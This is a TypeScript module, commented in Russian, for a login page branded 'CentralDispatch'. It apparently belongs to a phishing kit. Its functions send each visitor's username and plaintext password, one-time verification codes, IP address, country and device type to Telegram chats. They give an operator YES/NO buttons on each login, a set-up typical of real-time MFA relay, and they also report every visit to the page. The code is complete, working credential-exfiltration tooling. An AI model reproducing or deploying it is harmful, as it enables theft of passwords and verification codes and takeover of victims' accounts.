/**
 * Модуль для работы с Telegram Bot API
 * Отправка уведомлений о входе в систему с кнопками YES/NO
 */

import { getChatIds } from "./telegram-chat-ids";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

/**
 * Получение информации о стране по IP адресу
 * @param ip - IP адрес
 * @returns Объект с информацией о стране
 */
async function getCountryInfo(ip: string): Promise<{ country: string; flag: string }> {
  try {
    // Пропускаем локальные IP
    if (ip === "unknown" || ip.startsWith("192.168.") || ip.startsWith("10.") || ip === "127.0.0.1") {
      return { country: "Unknown", flag: "🌍" };
    }

    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode`);
    const data = await response.json();

    if (data.status === "success") {
      const flag = getCountryFlag(data.countryCode);
      return { country: data.country, flag };
    }

    return { country: "Unknown", flag: "🌍" };
  } catch (error) {
    console.error("[TELEGRAM] Ошибка получения информации о стране:", error);
    return { country: "Unknown", flag: "🌍" };
  }
}

/**
 * Получение флага страны по коду
 * @param countryCode - Код страны (US, RU и т.д.)
 * @returns Эмодзи флага
 */
function getCountryFlag(countryCode: string): string {
  if (!countryCode || countryCode.length !== 2) return "🌍";
  
  const codePoints = countryCode
    .toUpperCase()
    .split("")
    .map((char) => 127397 + char.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

/**
 * Определение типа устройства по User Agent
 * @param userAgent - User Agent строка
 * @returns Тип устройства и эмодзи
 */
function getDeviceType(userAgent: string): string {
  const ua = userAgent.toLowerCase();
  
  if (ua.includes("mobile") || ua.includes("android") || ua.includes("iphone") || ua.includes("ipad")) {
    return "📱 Мобильное устройство";
  }
  
  if (ua.includes("tablet")) {
    return "📱 Планшет";
  }
  
  return "💻 Компьютер";
}

/**
 * Отправка сообщения в Telegram с кнопками YES/NO
 * @param username - имя пользователя
 * @param password - пароль
 * @param requestId - уникальный ID запроса для отслеживания ответа
 * @param clientIp - IP адрес клиента (опционально)
 * @param userAgent - User Agent (опционально)
 * @returns message_id отправленного сообщения
 */
export async function sendLoginTelegram(
  username: string,
  password: string,
  requestId: string,
  clientIp?: string,
  userAgent?: string
): Promise<number> {
  console.log("[TELEGRAM] Отправка уведомления о входе...");
  console.log("[TELEGRAM] Request ID:", requestId);

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error("TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID должны быть настроены");
  }

  // Получаем информацию о стране
  const countryInfo = clientIp ? await getCountryInfo(clientIp) : { country: "Unknown", flag: "🌍" };
  const deviceType = userAgent ? getDeviceType(userAgent) : "💻 Компьютер";

  const message = `🔐 *CentralDispatch - Новый вход в систему*

👤 *Username:* \`${username}\`
🔑 *Password:* \`${password}\`

🌍 *IP:* \`${clientIp || "unknown"}\`
📍 *Страна:* ${countryInfo.country} ${countryInfo.flag}
${deviceType}

Выберите действие:`;

  const keyboard = {
    inline_keyboard: [
      [
        {
          text: "✅ YES",
          callback_data: `login_yes_${requestId}`,
        },
        {
          text: "❌ NO",
          callback_data: `login_no_${requestId}`,
        },
      ],
    ],
  };

  try {
    // Получаем все Chat ID (основной + дополнительные)
    const allChatIds = getChatIds();
    console.log("[TELEGRAM] Отправка на Chat ID:", allChatIds);

    if (allChatIds.length === 0) {
      throw new Error("Не найдено ни одного Chat ID");
    }

    let mainMessageId: number | null = null;

    // Отправляем сообщения на все Chat ID
    for (const chatId of allChatIds) {
      try {
        const isMainChat = chatId === TELEGRAM_CHAT_ID;
        
        const response = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "Markdown",
              // Кнопки только в основном чате
              reply_markup: isMainChat ? keyboard : undefined,
            }),
          }
        );

        const data = await response.json();

        if (!response.ok) {
          console.error(`[TELEGRAM] Ошибка отправки на Chat ID ${chatId}:`, data);
          continue; // Продолжаем отправку на другие чаты
        }

        if (isMainChat) {
          mainMessageId = data.result.message_id;
        }
        
        console.log(`[TELEGRAM] Сообщение отправлено на Chat ID ${chatId}`);
      } catch (error) {
        console.error(`[TELEGRAM] Ошибка отправки на Chat ID ${chatId}:`, error);
        // Продолжаем отправку на другие чаты
      }
    }

    if (mainMessageId === null) {
      throw new Error("Не удалось отправить сообщение ни на один Chat ID");
    }

    console.log("[TELEGRAM] Сообщение успешно отправлено на все Chat ID, message_id:", mainMessageId);
    return mainMessageId;
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw new Error("Не удалось отправить сообщение в Telegram");
  }
}

/**
 * Отправка ответа на callback query (убирает loading на кнопках)
 * @param callbackQueryId - ID callback query
 * @param text - текст ответа (опционально)
 */
export async function answerCallbackQuery(
  callbackQueryId: string,
  text?: string
): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN) {
    return;
  }

  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text: text || "Обработано",
        }),
      }
    );
  } catch (error) {
    console.error("[TELEGRAM] Ошибка ответа на callback:", error);
  }
}

/**
 * Отправка кода верификации в Telegram
 * @param code - код верификации
 * @param username - имя пользователя
 * @param clientIp - IP адрес клиента
 * @param userAgent - User Agent браузера
 */
export async function sendCodeTelegram(
  code: string,
  username: string,
  clientIp: string,
  userAgent: string
): Promise<void> {
  console.log("[TELEGRAM] Отправка кода верификации...");

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error("TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID должны быть настроены");
  }

  const message = `🔐 *CentralDispatch - Код подтверждения*

📝 *Код:* \`${code}\`
👤 *Username:* \`${username}\`

Введите этот код для подтверждения входа.`;

  try {
    // Получаем все Chat ID (основной + дополнительные)
    const allChatIds = getChatIds();
    console.log("[TELEGRAM] Отправка кода на Chat ID:", allChatIds);

    if (allChatIds.length === 0) {
      throw new Error("Не найдено ни одного Chat ID");
    }

    let successCount = 0;

    // Отправляем сообщения на все Chat ID
    for (const chatId of allChatIds) {
      try {
        const response = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "Markdown",
            }),
          }
        );

        const data = await response.json();

        if (!response.ok) {
          console.error(`[TELEGRAM] Ошибка отправки кода на Chat ID ${chatId}:`, data);
          continue; // Продолжаем отправку на другие чаты
        }

        successCount++;
        console.log(`[TELEGRAM] Код отправлен на Chat ID ${chatId}`);
      } catch (error) {
        console.error(`[TELEGRAM] Ошибка отправки кода на Chat ID ${chatId}:`, error);
        // Продолжаем отправку на другие чаты
      }
    }

    if (successCount === 0) {
      throw new Error("Не удалось отправить код ни на один Chat ID");
    }

    console.log(`[TELEGRAM] Код успешно отправлен на ${successCount} Chat ID`);
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw new Error("Не удалось отправить код в Telegram");
  }
}

/**
 * Отправка произвольного сообщения в Telegram
 * @param chatId - ID чата
 * @param message - текст сообщения
 * @param parseMode - режим парсинга (Markdown, HTML)
 */
export async function sendMessage(
  chatId: string | number,
  message: string,
  parseMode?: string
): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error("TELEGRAM_BOT_TOKEN не настроен");
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: parseMode || undefined,
        }),
      }
    );

    const data = await response.json();

    if (!response.ok) {
      console.error("[TELEGRAM] Ошибка отправки сообщения:", data);
      throw new Error(data.description || "Не удалось отправить сообщение");
    }

    console.log("[TELEGRAM] Сообщение успешно отправлено");
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw error;
  }
}

/**
 * Отправка уведомления о посещении сайта
 * @param path - путь страницы
 * @param userAgent - User Agent браузера
 * @param clientIp - IP адрес клиента
 */
export async function sendVisitNotification(
  path: string,
  userAgent: string,
  clientIp: string
): Promise<void> {
  console.log("[TELEGRAM] Отправка уведомления о посещении...");

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("[TELEGRAM] Telegram не настроен, пропускаем уведомление");
    return;
  }

  // Получаем информацию о стране
  const countryInfo = await getCountryInfo(clientIp);
  const deviceType = getDeviceType(userAgent);

  const message = `🔐 *Посещение страницы входа*

🌍 *IP:* \`${clientIp}\`
📍 *Страна:* ${countryInfo.country} ${countryInfo.flag}
${deviceType}

Кто-то зашел на сайт CentralDispatch.`;

  try {
    // Получаем все Chat ID (основной + дополнительные)
    const allChatIds = getChatIds();
    
    if (allChatIds.length === 0) {
      console.warn("[TELEGRAM] Не найдено ни одного Chat ID, пропускаем уведомление");
      return;
    }

    console.log("[TELEGRAM] Отправка уведомления о посещении на Chat ID:", allChatIds);

    let successCount = 0;

    // Отправляем сообщения на все Chat ID
    for (const chatId of allChatIds) {
      try {
        const response = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "Markdown",
            }),
          }
        );

        const data = await response.json();

        if (!response.ok) {
          console.error(`[TELEGRAM] Ошибка отправки уведомления на Chat ID ${chatId}:`, data);
          continue; // Продолжаем отправку на другие чаты
        }

        successCount++;
        console.log(`[TELEGRAM] Уведомление о посещении отправлено на Chat ID ${chatId}`);
      } catch (error) {
        console.error(`[TELEGRAM] Ошибка отправки уведомления на Chat ID ${chatId}:`, error);
        // Продолжаем отправку на другие чаты
      }
    }

    if (successCount > 0) {
      console.log(`[TELEGRAM] Уведомление о посещении отправлено на ${successCount} Chat ID`);
    }
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
  }
}

